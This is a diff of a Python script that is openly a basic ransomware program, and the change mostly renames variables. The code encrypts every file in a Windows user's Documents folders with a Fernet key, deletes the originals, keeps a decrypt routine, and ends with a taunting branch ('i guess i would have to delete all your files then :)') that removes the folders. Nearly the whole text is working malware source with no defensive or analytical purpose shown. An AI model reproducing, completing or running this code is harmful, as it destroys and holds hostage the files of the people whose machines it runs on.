@@ -1,4 +1,4 @@
-from cryptography.fernet import Fernet as fn
+from cryptography.fernet import Fernet as fen
 import os
 import platform
 global path, user, dirs
@@ -20,51 +20,51 @@ def gen_key():
         return key
     else:
         os.mkdir(path)
-        key = fn.generate_key()
+        key = fen.generate_key()
         with open(f'{path}mykey.key', 'wb') as keys:
             keys.write(key)
         return key
 
 
 def encrypt(key):
-    f = fn(key)
-    for i in dirs:
-        for dir in os.listdir(i):
-            if f"{i}{dir}" == f"C:\\Users\\{user}\\Documents\\My Music":
+    f = fen(key)
+    for d in dirs:
+        for ddir in os.listdir(d):
+            if f"{d}{ddir}" == f"C:\\Users\\{user}\\Documents\\My Music":
                 continue
-            if f"{i}{dir}" == f"C:\\Users\\{user}\\Documents\\My Pictures":
+            if f"{d}{ddir}" == f"C:\\Users\\{user}\\Documents\\My Pictures":
                 continue
-            if f"{i}{dir}" == f"C:\\Users\\{user}\\Documents\\My Videos":
+            if f"{d}{ddir}" == f"C:\\Users\\{user}\\Documents\\My Videos":
                 continue
-            with open(f"{i}{dir}", 'rb') as files:
+            with open(f"{d}{ddir}", 'rb') as files:
                 files = files.read()
 
             enc_pass = f.encrypt(files)
 
-            with open(f"{i}encrypted - {dir}", 'wb') as enc_files:
+            with open(f"{d}encrypted - {ddir}", 'wb') as enc_files:
                 enc_files.write(enc_pass)
-            os.remove(f"{i}{dir}")
+            os.remove(f"{d}{ddir}")
 
 
 def decrypt(key):
-    f = fn(key)
-    for i in dirs:
-        for dir in os.listdir(i):
-            if f"{i}{dir}" == f"C:\\Users\\{user}\\Documents\\My Music":
+    f = fen(key)
+    for d in dirs:
+        for ddir in os.listdir(d):
+            if f"{d}{ddir}" == f"C:\\Users\\{user}\\Documents\\My Music":
                 continue
-            if f"{i}{dir}" == f"C:\\Users\\{user}\\Documents\\My Pictures":
+            if f"{d}{ddir}" == f"C:\\Users\\{user}\\Documents\\My Pictures":
                 continue
-            if f"{i}{dir}" == f"C:\\Users\\{user}\\Documents\\My Videos":
+            if f"{d}{ddir}" == f"C:\\Users\\{user}\\Documents\\My Videos":
                 continue
             # print(f"{i}{dir}")
-            with open(f"{i}{dir}", 'rb') as files:
+            with open(f"{d}{ddir}", 'rb') as files:
                 files = files.read()
 
             enc_pass = f.decrypt(files)
 
-            with open(f"{i}{str(dir).replace('encrypted - ','')}", 'wb') as enc_files:
+            with open(f"{d}{str(ddir).replace('encrypted - ','')}", 'wb') as enc_files:
                 enc_files.write(enc_pass)
-            os.remove(f"{i}{dir}")
+            os.remove(f"{d}{ddir}")
 
 
 lol = gen_key()
@@ -87,14 +87,13 @@ while True:
             print("well... i guess i would have to delete all your files then :) ")
             print("\n GOOD BYE")
 
-            for i in dirs:
-                for dir in os.listdir(i):
-                    if f"{i}{dir}" == "C:\\Users\\aki\\Documents\\My Music":
+            for x in dirs:
+                for r in os.listdir(x):
+                    if f"{x}{r}" == "C:\\Users\\aki\\Documents\\My Music":
                         continue
-                    if f"{i}{dir}" == "C:\\Users\\aki\\Documents\\My Pictures":
+                    if f"{x}{r}" == "C:\\Users\\aki\\Documents\\My Pictures":
                         continue
-                    if f"{i}{dir}" == "C:\\Users\\aki\\Documents\\My Videos":
+                    if f"{x}{r}" == "C:\\Users\\aki\\Documents\\My Videos":
                         continue
-                    os.remove(i)
+                    os.remove(x)
                     exit("Enjoy ;)")
-
